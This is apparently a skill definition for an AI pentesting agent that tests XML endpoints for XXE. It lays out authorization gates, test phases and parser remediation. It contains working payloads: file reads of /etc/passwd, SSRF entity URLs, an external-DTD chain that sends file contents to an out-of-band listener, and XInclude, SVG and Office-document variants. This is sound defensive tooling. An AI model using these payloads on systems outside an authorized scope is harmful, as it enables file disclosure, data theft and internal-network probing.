---
name: xxe-hunter
description: "Tests XML-accepting endpoints for XML External Entity (XXE) injection — classic in-band file disclosure, blind out-of-band exfiltration via external DTDs, SSRF via entity URLs, and XInclude variants. Use when an endpoint accepts `application/xml`, `text/xml`, SOAP, SVG, DOCX, XLSX, or RSS/Atom payloads; when upload handlers parse XML; or when the orchestrator surfaces XML prologs in request bodies. Produces findings with CWE-611 mapping, per-endpoint request/response evidence, and parser-config remediation snippets. Defensive testing only, against assets listed in .claude/security-scope.yaml."
model: sonnet
allowed-tools: >
  Read, Grep, Glob, Write(path:.claude/planning/**),
  WebFetch,
  Bash(curl:*), Bash(wget:*), Bash(httpx:*), Bash(ffuf:*),
  Bash(gobuster:*), Bash(nuclei:*), Bash(jq:*), Bash(arjun:*),
  Bash(gf:*), Bash(gau:*), Bash(waybackurls:*),
  Bash(nmap:--script=safe*), Bash(nmap:-sV), Bash(nmap:-Pn),
  Bash(dig:*), Bash(host:*), Bash(whois:*),
  Bash(openssl:s_client*), Bash(openssl:x509*)
metadata:
  version: 1.0.0
  category: security-testing
  subcategory: injection
  authorization_required: true
  tier: T1
  source_methodology: "Guia Completo de Segurança e Testes em Ataques XXE.md"
  service_affecting: false
  composed_from: []
---

# XXE Hunter

## Goal

Audit every endpoint that accepts or processes XML for XML External Entity
(XXE) injection — the flaw that occurs when an XML parser resolves
attacker-declared external entities and leaks local files, issues outbound
requests, or consumes CPU/memory. This skill implements WSTG-INPV-07 and
maps findings to CWE-611 (Improper Restriction of XML External Entity
Reference) and OWASP ASVS V14.4. The goal is to hand the engineering team a
concrete list of vulnerable parsers with request/response evidence and
parser-configuration remediation for the libraries in use (libxml2, Xerces,
Nokogiri, SAXParserFactory, etc.).

## When to Use

- Request bodies contain an XML prolog (`<?xml version="1.0"...?>`) — the
  server is definitely parsing XML somewhere.
- The endpoint's `Content-Type` is `application/xml`, `text/xml`, or a SOAP
  variant (`application/soap+xml`).
- The target accepts uploads of XML-containing formats: SVG, DOCX/XLSX/PPTX
  (Office Open XML), ODT, KML, RSS/Atom feeds, Spring config, SAML assertions.
- API recon surfaced SAML SSO endpoints or any `<soap:Envelope>` traffic.
- Enterprise integration endpoints (eInvoicing, EDI gateways, government
  portals) that exchange XML.
- The orchestrator selects this skill after `api-recon` or
  `web-recon-active` identifies XML-accepting endpoints.

## When NOT to Use

- For flaws in how the application USES the parsed XML data downstream —
  use the relevant class (`sqli-hunter`, `command-injection-hunter`).
- For JSON or form-encoded endpoints — XXE requires XML parsing.
- For pure authentication flaws (e.g., SAML signature validation bypass)
  that don't involve entity resolution — use `auth-flaw-hunter`.
- For DoS billion-laughs / quadratic-blowup payloads against production
  assets without `destructive_testing: approved` in scope.
- Any asset not listed in `.claude/security-scope.yaml` or whose
  `testing_level` is not `active`.

## Authorization Check (MANDATORY FIRST STEP)

Before ANY outbound activity:

1. Read `.claude/security-scope.yaml`. If the file doesn't exist or doesn't
   parse, halt and report.
2. Confirm the intended target appears in the `assets` list AND the
   target's `testing_level` is `active`.
3. DoS payloads (billion laughs, quadratic blowup) are forbidden unless
   the asset has `destructive_testing: approved` AND
   `service_affecting: approved`. Default is to skip those steps.
4. If the target is ambiguous, write it to
   `.claude/planning/{issue}/SCOPE_QUESTIONS.md` and halt for that target
   only.
5. Log the authorization check to
   `.claude/planning/{issue}/SECURITY_AUDIT.md` Skills Run Log with status
   `running`.

## Inputs

The skill expects the caller to provide:

- `{issue}`: the planning folder name
- `{target}`: the asset identifier from security-scope.yaml
- `{scope_context}`: optional — specific XML-accepting endpoints to focus on
- `{oob_listener}`: the authorized out-of-band listener URL for blind-XXE
  tests (must appear in scope.yaml `oob_listener` list)
- `{user_a}`: authenticated session if the endpoints require auth

If the endpoint requires authentication but no session is provided, halt
and request credentials.

## Methodology

### Phase 1: Discover XML Parsing Surface

1. **Find XML-accepting endpoints** [Bug Bounty Bootcamp, Ch 15, p. 250]

   Do: Read `.claude/planning/{issue}/API_INVENTORY.md`. Filter endpoints
   that: accept `Content-Type: application/xml` or `text/xml`; receive
   SOAP requests; accept file uploads of SVG/Office/OXML/SAML. If no
   inventory exists, request that `api-recon` run first.

   Record: `.claude/planning/{issue}/xxe-targets.md` listing each endpoint
   with its expected Content-Type and whether uploads are accepted.

2. **Baseline legitimate parses** [WSTG v4.2, WSTG-INPV-07]

   Do: For each target, capture a known-good XML request and its response
   (this is the baseline — success looks like X, errors look like Y).

   Record: Baselines in `xxe-targets.md` per endpoint.

### Phase 2: Classic (In-Band) XXE

3. **Basic file-read probe** [WAHH, Ch 10, p. 385]

   Do: Replace a string value in the XML body with an external-entity
   reference to `file:///etc/hostname` (harmless, small file). Example:

   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
   <root><name>&xxe;</name></root>
   ```

   Vulnerable response: The response body contains the host's hostname.

   Not-vulnerable response: The entity is rendered literally, the parser
   errors out with "entity not allowed", or the response is empty where it
   was previously populated.

   Record: If vulnerable, append FINDING-NNN with the request/response pair.

4. **`/etc/passwd` confirmation** [Bug Bounty Bootcamp, Ch 15, p. 254]

   Do: Upgrade from `hostname` to `file:///etc/passwd`. Confirms read access
   to arbitrary readable files as the web-server user.

   Vulnerable response: Response contains `root:x:0:0:root:/root:/bin/bash`
   and similar lines.

   Not-vulnerable response: The probe succeeded on `hostname` but fails on
   `/etc/passwd` — indicates the parser is vulnerable but the web-server
   user can't read the file (still a vulnerability; see severity rubric).

### Phase 3: SSRF via Entity URL

5. **Entity-URL SSRF probe** [WAHH, Ch 10, p. 386]

   Do: Replace the file URL with an HTTP/HTTPS URL pointing at the
   authorized OOB listener. Example:

   ```xml
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob_listener}/xxe-ssrf-1">]>
   ```

   Vulnerable response: The listener receives a connection from the target's
   IP. Time-correlate the request/response with the listener log to confirm
   it was this specific probe.

   Not-vulnerable response: No connection on the listener.

   Record: A successful SSRF contact is a finding even without the file-read
   vector — external entity resolution is still happening.

6. **Internal-network probe** [WAHH, Ch 10, p. 386]

   Do: Only if the scope file explicitly lists internal hostnames as
   in-scope (`internal_targets: [10.0.0.0/8, ...]`), point the entity at
   internal resources. Skip otherwise — do NOT probe RFC1918 ranges
   without explicit authorization.

   Vulnerable response: Differential responses (200 vs 500 vs timeout)
   indicate the internal host responds — information disclosure.

### Phase 4: Blind XXE (Out-of-Band)

7. **External-DTD exfiltration** [Bug Bounty Bootcamp, Ch 15, p. 257]

   Do: Host an external DTD on the OOB listener
   (`{oob_listener}/evil.dtd`) containing a parameter entity that reads
   a local file and appends it as a URL component to a second callback:

   ```xml
   <!ENTITY % file SYSTEM "file:///etc/hostname">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{oob_listener}/exfil?x=%file;'>">
   %eval;
   %exfil;
   ```

   Send the body referencing this DTD. The exfiltrated hostname arrives as
   a query param on the OOB listener.

   Vulnerable response: Listener logs an `/exfil?x={hostname}` hit.

   Not-vulnerable response: External DTD blocked (common mitigation even
   when internal entities work).

8. **Error-based blind XXE** [Bug Bounty Bootcamp, Ch 15, p. 257]

   Do: If OOB egress is blocked, use an external DTD that references a
   non-existent path containing the stolen data, triggering a verbose error
   message that echoes the path. Example:

   ```xml
   <!ENTITY % file SYSTEM "file:///etc/hostname">
   <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
   %eval;
   %err;
   ```

   Vulnerable response: 500 error echoes the file contents in the error
   path.

   Not-vulnerable response: Errors are sanitized before display.

### Phase 5: XInclude and Variant Vectors

9. **XInclude injection** [Bug Bounty Bootcamp, Ch 15, p. 254]

   Do: When the parser rejects DOCTYPE declarations but the server
   integrates user XML into a larger document, try XInclude:

   ```xml
   <foo xmlns:xi="http://www.w3.org/2001/XInclude">
     <xi:include parse="text" href="file:///etc/hostname"/>
   </foo>
   ```

   Vulnerable response: Hostname appears in the merged response.

   Not-vulnerable response: XInclude is disabled (it's off by default in
   most parsers but some apps enable it).

10. **SVG file-upload XXE** [WSTG v4.2, WSTG-INPV-07]

    Do: For upload endpoints that accept SVG, embed an XXE in the SVG
    file. Many image processors (ImageMagick, Batik) parse SVG as XML.

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
    <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
    ```

    Vulnerable response: Uploaded image contains the hostname as rendered
    text, or a server-side preview/thumbnailer leaks the entity.

11. **OXML document XXE** [Bug Bounty Bootcamp, Ch 15]

    Do: For upload endpoints accepting `.docx/.xlsx/.pptx`, edit
    `word/document.xml` (or equivalent) inside the zip to embed an XXE
    payload. Many document processors (Apache POI, python-docx,
    officeparser) parse these with vulnerable defaults.

    Vulnerable response: Processed document output contains the entity
    value, or server-side logs show the entity being resolved.

## Payload Library

Categories (full payloads in `references/payloads.md`):

- **File-read**: in-band `&xxe;` references with varying URL schemes
  (`file://`, `jar://`, `netdoc://`, `phar://`)
- **SSRF**: HTTP/HTTPS entity URLs pointing at OOB listener, internal
  hostnames (if scope allows)
- **Blind exfiltration**: parameter-entity chains for OOB exfil via
  external DTDs
- **Error-based blind**: nonexistent-path vectors that echo file contents
  in error messages
- **XInclude**: XInclude namespace vectors for DOCTYPE-stripping parsers
- **SVG/OXML**: file-upload vectors for image and document processors
- **DoS (gated)**: billion-laughs, quadratic blowup — only with
  `destructive_testing: approved`

## Output Format

Findings append to `.claude/planning/{issue}/SECURITY_AUDIT.md` per the
schema in `.claude/skills/_shared/finding-schema.md`.

Specific to this skill:

- **CWE**: CWE-611 (Improper Restriction of XML External Entity Reference).
  For SSRF variants, add CWE-918. For DoS variants, add CWE-776.
- **OWASP**: WSTG-INPV-07. For APIs, map to OWASP API8:2019 (Injection).
  For web apps, ASVS V14.4.
- **CVSS vectors**: file-read typically `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`.
  SSRF to internal: `...C:H/I:L/A:L`. RCE via Java/.NET specialized
  wrappers: `...C:H/I:H/A:H`.
- **Evidence**: the exact XML request body, the response (or listener log
  for blind), and a note on the parser library identified (from error
  messages or Server header).
- **Remediation framing**: backend engineer who owns the endpoint.
  Include library-specific `references/remediation.md` snippets for:
  libxml2 (`XML_PARSE_NONET | XML_PARSE_NOENT` disabled), Java
  (`XMLInputFactory.setProperty(IS_SUPPORTING_EXTERNAL_ENTITIES, false)`),
  .NET (`XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`),
  Python (`defusedxml`), Ruby (`Nokogiri::XML::ParseOptions::NONET`).

The skill also updates:

- `.claude/planning/{issue}/STATUS.md` — its row under Phase 7: Security
- `.claude/planning/{issue}/SECURITY_AUDIT.md` Skills Run Log

## Quality Check (Self-Review)

Before marking complete, verify:

- [ ] Every finding has a baseline request/response AND an exploit
      request/response (or listener log for blind variants)
- [ ] Every finding names the parser library if possible (from error
      messages, X-Powered-By, or fingerprinting)
- [ ] Every finding includes a library-specific remediation snippet
- [ ] No DoS payloads ran against assets without
      `destructive_testing: approved`
- [ ] No OOB listener was used that isn't in the scope file's allowlist
- [ ] No internal-network probes without explicit scope authorization
- [ ] Skills Run Log row updated from `running` to `complete` or
      `halted:{reason}`

## Common Issues

- **Permission-denied on file read**: The parser is vulnerable and
  processes the entity, but the web-server user lacks permissions to read
  the specific file (e.g., `/etc/shadow`), returning a "permission denied"
  or empty-string entity. This is STILL a vulnerability — the parser
  resolves externals. Use `/etc/hostname` or `/etc/passwd` for
  confirmation since those are typically world-readable.

- **WAF echo**: A WAF blocks the request but echoes the malicious payload
  in its own error response. A reflection in the WAF page is NOT proof of
  XXE. Confirm by comparing the app's actual response body with a
  non-malicious baseline — the reflection should only appear in the app
  response, not the WAF response.

- **Network latency misread as SSRF**: Variations in response time during
  SSRF testing may be caused by general network load rather than the
  server attempting to connect to an internal host. Use differential
  timing (test with a known-dead and known-alive internal IP to baseline)
  and always confirm SSRF with an OOB listener hit, never just timing.

- **Parameter entities required**: Some parsers allow general entities in
  the DOCTYPE but forbid parameter entities. Blind-XXE via external DTDs
  requires parameter entities — may fail while classic in-band XXE works.

## References

- `references/payloads.md` — complete payload library (in-band, SSRF,
  blind, XInclude, SVG, OXML)
- `references/remediation.md` — parser-configuration snippets per library

External:
- WSTG-INPV-07: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection
- CWE-611: https://cwe.mitre.org/data/definitions/611.html
- OWASP XXE Prevention Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

## Source Methodology

Converted from:
`pentest-agent-development/notebooklm-notes/Guia Completo de Segurança e Testes em Ataques XXE.md`

Grounded in:
- Bug Bounty Bootcamp, Ch 15 (XXE)
- The Web Application Hacker's Handbook, Ch 10 (Attacking Back-End Components)
- Web Hacking 101, Ch 14 (XXE case studies)
- OWASP WSTG v4.2 (WSTG-INPV-07)
- The Tangled Web, Ch 4

Conversion date: 2026-04-23
Conversion prompt version: 1.0
